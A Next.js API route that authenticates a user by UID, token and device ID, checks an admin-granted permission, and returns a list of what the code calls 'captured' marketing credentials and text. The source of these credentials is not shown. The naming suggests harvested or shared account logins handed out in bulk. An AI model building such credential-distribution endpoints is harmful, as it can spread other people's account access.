import { NextRequest, NextResponse } from 'next/server';
import { verifyAndHeartbeat, getCapturedCredentials } from '@/lib/portal-storage';

export const dynamic = 'force-dynamic';

export async function GET(request: NextRequest) {
  try {
    const uid = request.headers.get('x-user-uid');
    const token = request.headers.get('x-user-token');
    const deviceId = request.headers.get('x-user-device');

    if (!uid || !token || !deviceId) {
      return NextResponse.json(
        { ok: false, error: 'UNAUTHORIZED', message: 'Authentication headers required' },
        { status: 401 }
      );
    }

    // Verify session & single-device validity
    const check = await verifyAndHeartbeat({
      uid: String(uid).trim(),
      token: String(token).trim(),
      deviceId: String(deviceId).trim(),
    });

    if (!check.valid) {
      return NextResponse.json(
        { ok: false, error: check.reason, message: check.message },
        { status: 403 }
      );
    }

    // Check if admin allows this user to access marketing credentials
    if (!check.can_access_marketing && check.user?.role !== 'admin') {
      return NextResponse.json(
        {
          ok: false,
          error: 'MARKETING_ACCESS_DENIED',
          message:
            'Access Restricted: Admin has not granted your UID permission to access marketing credentials on this device. Please request approval from your administrator.',
          can_access_marketing: false,
        },
        { status: 403 }
      );
    }

    // Fetch marketing credentials & captured text
    const captures = await getCapturedCredentials();

    return NextResponse.json({
      ok: true,
      can_access_marketing: true,
      count: captures.length,
      captures,
    });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ ok: false, error: message }, { status: 500 });
  }
}
